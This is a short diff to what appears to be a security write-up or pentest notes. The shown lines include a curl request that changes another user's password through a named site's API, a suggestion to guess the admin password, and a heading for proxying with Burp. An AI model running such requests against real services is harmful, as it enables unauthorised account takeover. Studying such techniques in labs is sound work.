@@ -74,6 +74,7 @@ curl -X POST "https://tarkash.surapura.in/api/change-password \
   -d '{"user_id": 8, "new_password": "pwned-masino123"}'
 ```
 - also you can try to guess admin's pass and login
+#
 
 # Proxy with Burp ![](https://img.shields.io/badge/Burp--orange?logo=burpsuite&logoColor=orange)
 
